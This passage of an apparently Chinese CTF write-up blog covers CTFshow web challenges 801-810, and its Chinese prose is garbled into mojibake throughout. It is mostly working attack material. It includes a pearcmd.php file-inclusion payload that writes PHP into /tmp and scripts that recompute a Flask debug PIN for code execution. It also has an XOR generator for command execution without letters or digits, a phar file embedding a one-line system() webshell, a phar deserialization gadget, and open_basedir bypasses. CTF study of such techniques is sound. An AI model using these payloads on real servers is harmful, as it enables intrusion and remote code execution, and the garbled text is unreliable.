href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">åœ¨æ­¤</a></p><blockquote><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p><p>åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚</p><p>æˆ‘æœ€æ—©çš„æ—¶å€™æ˜¯åœ¨é˜…è¯»phpinfo()çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Dockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯<code>register_argc_argv</code>è¿™ä¸ªé…ç½®ã€‚æ–‡æ¡£ä¸­å¯¹è¿™ä¸ªé€‰é¡¹çš„ä»‹ç»ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯ï¼Œå½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™<code>$argc</code>ã€<code>$argv</code>ã€<code>$_SERVER[&#39;argv&#39;]</code>å‡ ä¸ªå˜é‡ã€‚</p><p>å¦‚æœPHPä»¥å‘½ä»¤è¡Œçš„å½¢å¼è¿è¡Œï¼ˆå³sapiæ˜¯cliï¼‰ï¼Œè¿™é‡Œå¾ˆå¥½ç†è§£ã€‚ä½†å¦‚æœPHPä»¥Serverçš„å½¢å¼è¿è¡Œï¼Œä¸”åˆå¼€å¯äº†<code>register_argc_argv</code>ï¼Œé‚£ä¹ˆè¿™å…¶ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Ÿ</p><p>HTTPæ•°æ®åŒ…ä¸­çš„query-stringä¼šè¢«ä½œä¸ºargvçš„å€¼</p></blockquote><p>æœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶/tmp/hello.phpæ–‡ä»¶ä¸­å°±æœ‰äº†æˆ‘ä»¬å†™å…¥çš„<code>&lt;?=phpinfo()?&gt;</code>ï¼Œæ–‡ä»¶åŒ…å«å³å¯</p><p><strong>810</strong></p><h3 id="SSRFæ‰“PHP-FPM"><a href="#SSRFæ‰“PHP-FPM" class="headerlink" title="SSRFæ‰“PHP-FPM"></a>SSRFæ‰“PHP-FPM</h3><p>æœ‰å·¥å…·ä¸ç”¨***</p><pre class="line-numbers language-none"><code class="language-none">title: CTFshowå¸¸ç”¨å§¿åŠ¿date: 2022-06-04 16:20:22tags:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>801</strong></p><h3 id="flaskè®¡ç®—PIN-1"><a href="#flaskè®¡ç®—PIN-1" class="headerlink" title="flaskè®¡ç®—PIN"></a>flaskè®¡ç®—PIN</h3><p><strong>ä»€ä¹ˆæ˜¯PINç </strong></p><p>PINç ä¹Ÿå°±æ˜¯flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼</p><p><strong>æ³¨æ„äº‹é¡¹ï¼šè°¨è®°ï¼ï¼python 3.8ï¼ˆmd5ï¼‰å’Œ3.6ï¼ˆsha1ï¼‰pinç ç”Ÿæˆæ–¹å¼ä¸åŒ</strong></p><p><strong>ä½¿ç”¨æ¡ä»¶ï¼šflask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</strong></p><p>é¦–å…ˆæ˜¯python PINç çš„ç”Ÿæˆè„šæœ¬</p><pre class="line-numbers language-none"><code class="language-none">#ç”Ÿæ•ˆæ—¶é—´ä¸ºä¸€å‘¨PIN_TIME &#x3D; 60 * 60 * 24 * 7def hash_pin(pin: str) -&gt; str:    return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12]_machine_id: t.Optional[t.Union[str, bytes]] &#x3D; None#è·å–æœºå™¨å·def get_machine_id() -&gt; t.Optional[t.Union[str, bytes]]:    global _machine_id    if _machine_id is not None:        return _machine_id    def _generate() -&gt; t.Optional[t.Union[str, bytes]]:        linux &#x3D; b&quot;&quot;        # machine-id is stable across boots, boot_id is not.        for filename in &quot;&#x2F;etc&#x2F;machine-id&quot;, &quot;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;:            try:                with open(filename, &quot;rb&quot;) as f:                    value &#x3D; f.readline().strip()            except OSError:                continue            if value:            #è¯»å–æ–‡ä»¶è¿›è¡Œæ‹¼æ¥                linux +&#x3D; value                break        # Containers share the same machine id, add some cgroup        # information. This is used outside containers too but should be        # relatively stable across boots.        try:            with open(&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;, &quot;rb&quot;) as f:            #ç»§ç»­è¿›è¡Œæ‹¼æ¥ï¼Œè¿™é‡Œå¤„ç†ä¸€ä¸‹åªè¦&#x2F;dockeråçš„ä¸œè¥¿                linux +&#x3D; f.readline().strip().rpartition(b&quot;&#x2F;&quot;)[2]        except OSError:            pass        if linux:            return linux        # On OS X, use ioreg to get the computer&#39;s serial number.        try:            # subprocess may not be available, e.g. Google App Engine            # https:&#x2F;&#x2F;github.com&#x2F;pallets&#x2F;werkzeug&#x2F;issues&#x2F;925            from subprocess import Popen, PIPE            dump &#x3D; Popen(                [&quot;ioreg&quot;, &quot;-c&quot;, &quot;IOPlatformExpertDevice&quot;, &quot;-d&quot;, &quot;2&quot;], stdout&#x3D;PIPE            ).communicate()[0]            match &#x3D; re.search(b&#39;&quot;serial-number&quot; &#x3D; &lt;([^&gt;]+)&#39;, dump)            if match is not None:                return match.group(1)        except (OSError, ImportError):            pass        # On Windows, use winreg to get the machine guid.        if sys.platform &#x3D;&#x3D; &quot;win32&quot;:            import winreg            try:                with winreg.OpenKey(                    winreg.HKEY_LOCAL_MACHINE,                    &quot;SOFTWARE\\Microsoft\\Cryptography&quot;,                    0,                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,                ) as rk:                    guid: t.Union[str, bytes]                    guid_type: int                    guid, guid_type &#x3D; winreg.QueryValueEx(rk, &quot;MachineGuid&quot;)                    if guid_type &#x3D;&#x3D; winreg.REG_SZ:                        return guid.encode(&quot;utf-8&quot;)                    return guid            except OSError:                pass        return None    _machine_id &#x3D; _generate()    return _machine_idclass _ConsoleFrame:    &quot;&quot;&quot;Helper class so that we can reuse the frame console code for the    standalone console.    &quot;&quot;&quot;    def __init__(self, namespace: t.Dict[str, t.Any]):        self.console &#x3D; Console(namespace)        self.id &#x3D; 0def get_pin_and_cookie_name(    app: &quot;WSGIApplication&quot;,) -&gt; t.Union[t.Tuple[str, str], t.Tuple[None, None]]:    &quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns &#96;None&#96;.    Second item in the resulting tuple is the cookie name for remembering.    &quot;&quot;&quot;    pin &#x3D; os.environ.get(&quot;WERKZEUG_DEBUG_PIN&quot;)    rv &#x3D; None    num &#x3D; None    # Pin was explicitly disabled    if pin &#x3D;&#x3D; &quot;off&quot;:        return None, None    # Pin was provided explicitly    if pin is not None and pin.replace(&quot;-&quot;, &quot;&quot;).isdigit():        # If there are separators in the pin, return it directly        if &quot;-&quot; in pin:            rv &#x3D; pin        else:            num &#x3D; pin    modname &#x3D; getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)    username: t.Optional[str]    try:        # getuser imports the pwd module, which does not exist in Google        # App Engine. It may also raise a KeyError if the UID does not        # have a username, such as in Docker.        username &#x3D; getpass.getuser()    except (ImportError, KeyError):        username &#x3D; None    mod &#x3D; sys.modules.get(modname)    # This information only exists to make the cookie unique on the    # computer, not as a security feature.    probably_public_bits &#x3D; [        username,        modname,        getattr(app, &quot;__name__&quot;, type(app).__name__),        getattr(mod, &quot;__file__&quot;, None),    ]    # This information is here to make it harder for an attacker to    # guess the cookie name.  They are unlikely to be contained anywhere    # within the unauthenticated debug page.    private_bits &#x3D; [str(uuid.getnode()), get_machine_id()]    h &#x3D; hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, str):            bit &#x3D; bit.encode(&quot;utf-8&quot;)        h.update(bit)    h.update(b&quot;cookiesalt&quot;)    cookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;    # If we need to generate a pin we salt it a bit more so that we don&#39;t    # end up with the same value and generate out 9 digits    if num is None:        h.update(b&quot;pinsalt&quot;)        num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]    # Format the pincode in groups of digits for easier remembering if    # we don&#39;t have a result yet.    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size &#x3D;&#x3D; 0:                rv &#x3D; &quot;-&quot;.join(                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)                    for x in range(0, len(num), group_size)                )                break        else:            rv &#x3D; num    return rv, cookie_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±ä¸Šå¯ä»¥çœ‹å¾—å‡ºPINå€¼ç”Ÿæˆæ‰€éœ€è¦è·å–çš„æ•°æ®æœ‰</p><ul><li>usernameï¼Œç”¨æˆ·å</li><li>modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app</li><li>appnameï¼Œé»˜è®¤å€¼ä¸ºFlask</li><li>moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„</li><li>uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°</li><li>machine_idï¼Œdockeræœºå™¨idæˆ–æœ¬æœºid</li></ul><p>é¦–å…ˆæ˜¯ç”¨æˆ·å</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png" alt="img"></p><p>å¯ç”¨çš„ä¼¼ä¹åªæœ‰root</p><p>ä¸‹é¢ä¸‰é¡¹ä»»æ„æŠ¥é”™å³å¯è·å¾—</p><p>macåœ°å€</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png" alt="img"></p><p>Machine_id</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png" alt="img"></p><p>æœ¬æœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">#MD5import hashlibfrom itertools import chainprobably_public_bits &#x3D; [     &#39;flaskweb&#39;# username     &#39;flask.app&#39;,# modname     &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))     &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits &#x3D; [     &#39;25214234362297&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address     &#39;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&#39;utf-8&#39;)    h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None:   h.update(b&#39;pinsalt&#39;)   num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None:   for group_size in 5, 4, 3:       if len(num) % group_size &#x3D;&#x3D; 0:          rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                      for x in range(0, len(num), group_size))          break       else:          rv &#x3D; numprint(rv)#sha1import hashlibfrom itertools import chainprobably_public_bits &#x3D; [    &#39;root&#39;# &#x2F;etc&#x2F;passwd    &#39;flask.app&#39;,# é»˜è®¤å€¼    &#39;Flask&#39;,# é»˜è®¤å€¼    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # æŠ¥é”™å¾—åˆ°]private_bits &#x3D; [    &#39;2485377581187&#39;,#  &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 16è¿›åˆ¶è½¬10è¿›åˆ¶    #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1.&#x2F;etc&#x2F;machine-id 2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 3.&#x2F;proc&#x2F;self&#x2F;cgroup    &#39;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#39;#  &#x2F;proc&#x2F;self&#x2F;cgroup]h &#x3D; hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&#39;utf-8&#39;)    h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None:    h.update(b&#39;pinsalt&#39;)    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                          for x in range(0, len(num), group_size))            break    else:        rv &#x3D; numprint(rv)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨æœ€ç»ˆç”Ÿæˆçš„PINè¿›å…¥ä»£ç è°ƒè¯•ï¼ŒRCE</p><p><strong>802</strong></p><h3 id="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ-1"><a href="#æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ-1" class="headerlink" title="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"></a>æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</h3><p>å¼‚æˆ–æ³•ï¼Œå·ä¸ªè„šæœ¬å–µå–µ</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*author yu22x*&#x2F;$myfile &#x3D; fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents&#x3D;&quot;&quot;;for ($i&#x3D;0; $i &lt; 256; $i++) &#123;    for ($j&#x3D;0; $j &lt;256 ; $j++) &#123;        if($i&lt;16)&#123;            $hex_i&#x3D;&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i&#x3D;dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j&#x3D;&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j&#x3D;dechex($j);        &#125;        $preg &#x3D; &#39;&#x2F;[a-z0-9]&#x2F;i&#39;; &#x2F;&#x2F;æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;            echo &quot;&quot;;        &#125;        else&#123;            $a&#x3D;&#39;%&#39;.$hex_i;            $b&#x3D;&#39;%&#39;.$hex_j;            $c&#x3D;(urldecode($a)^urldecode($b));            if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;                $contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;            &#125;        &#125;    &#125;&#125;fwrite($myfile,$contents);fclose($myfile);# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1&#x3D;&quot;&quot;   s2&#x3D;&quot;&quot;   for i in arg:       f&#x3D;open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t&#x3D;f.readline()           if t&#x3D;&#x3D;&quot;&quot;:               break           if t[0]&#x3D;&#x3D;i:               #print(i)               s1+&#x3D;t[2:5]               s2+&#x3D;t[6:9]               break       f.close()   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param&#x3D;action(input(&quot;\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;))+&quot;;&quot;   print(param)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>803</strong></p><h3 id="pharæ–‡ä»¶åŒ…å«-1"><a href="#pharæ–‡ä»¶åŒ…å«-1" class="headerlink" title="pharæ–‡ä»¶åŒ…å«"></a>pharæ–‡ä»¶åŒ…å«</h3><p>æ¥è‡ªå¤§ä½¬çš„æç¤ºï¼šæŠŠpharå½“å‹ç¼©åŒ…ç”¨å°±è¡Œ</p><p>é¦–å…ˆç”ŸæˆåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„pharæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;); &#x2F;&#x2F;è®¾ç½®stub$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;&lt;?php system($_POST[a]);?&gt;&#39;); &#x2F;&#x2F;$phar-&gt;stopBuffering();&#x2F;&#x2F; pharç”Ÿæˆ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶pharåŒ…ä¸­çš„test.txtä¸­çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬äº†</p><p>ä¸Šä¼ æ–‡ä»¶ï¼ˆè®°å¾—è¯»å–ç„¶åurlç¼–ç ä¸€ä¸‹ï¼‰</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;tmp&#x2F;phar.phar&amp;content&#x3D;%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>includeå¹²</p><p><img src="file:///Users/jlan/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-06-06%2020.00.48.png?lastModify=1654679483" alt="æˆªå±2022-06-06 20.00.48"></p><p><strong>804</strong></p><h3 id="pharååºåˆ—åŒ–-1"><a href="#pharååºåˆ—åŒ–-1" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3><p>è¿™ä¸ç”¨æ•™å§</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass hacker&#123;    public $code;&#125;&#x2F;&#x2F; @unlink(&quot;phar.phar&quot;);$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar&#x2F;&#x2F; $phar &#x3D; $phar-&gt;convertToExecutable(Phar::TAR, Phar::GZ); &#x2F;&#x2F;å‹ç¼©è§„é¿æ•æ„Ÿå­—ç¬¦$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub$o &#x3D; new hacker();$o-&gt;code&#x3D;&quot;highlight_file(&#39;flag.php&#39;);&quot;;$phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶&#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();&#x2F;&#x2F; pharç”Ÿæˆ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ pharåè®®è¯»å–å°±è¡Œ</p><p><strong>805</strong></p><h3 id="open-basedirç»•è¿‡-1"><a href="#open-basedirç»•è¿‡-1" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h3><blockquote><p>open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚</p><p>å‡è®¾open_basedir=/var/www/html/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚</p><p>æ³¨æ„ï¼šç”¨open_basediræŒ‡å®šçš„<strong>é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å</strong>ã€‚</p><p>æ–‡ç« æ¥è‡ª<a href="https://www.cnblogs.com/hookjoy/p/12846164.html">è¿™é‡Œ</a></p></blockquote><p>ä½†æ˜¯è¿™ä¸ªé…ç½®å¯¹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œæ¯”å¦‚æ‰§è¡Œ<code>system(&#39;ls /&#39;)</code>çš„æ—¶å€™å°±ä¸å—é™åˆ¶ï¼Œ<del>ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šè¢«banæ‰</del></p><p>ä¸‹é¢å°±æ˜¯ä¸€äº›bypassæ–¹æ³•</p><ol><li><p>globåè®®ï¼Œåªèƒ½æææ–‡ä»¶å</p><pre class="line-numbers language-none"><code class="language-none">$a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;;if ( $b &#x3D; opendir($a) ) &#123;  while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;    echo $file.&quot;\n&quot;;  &#125;  closedir($b);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass</p><p>åŸç†åœ¨è¿™é‡Œ</p><pre class="line-numbers language-none"><code class="language-none">mkdir(&quot;s&quot;);chdir(&#39;s&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo file_get_contents(&quot;&#x2F;ctfshowflag&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åˆ©ç”¨bindtextdomain()å‡½æ•°Bypass</p><p>è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½æææ–‡ä»¶å</p><blockquote><p><strong>bindtextdomain()å‡½æ•°</strong></p><p>(PHP 4, PHP 5, PHP 7)</p><p>bindtextdomain()å‡½æ•°ç”¨äºç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚</p><pre class="line-numbers language-none"><code class="language-none">bindtextdomain ( string $domain , string $directory ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bindtextdomain()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°$directoryæ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå®ƒä¼šåœ¨$directoryå­˜åœ¨çš„æ—¶å€™è¿”å›$directoryï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚</p></blockquote><p>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹directoryå‚æ•°æ 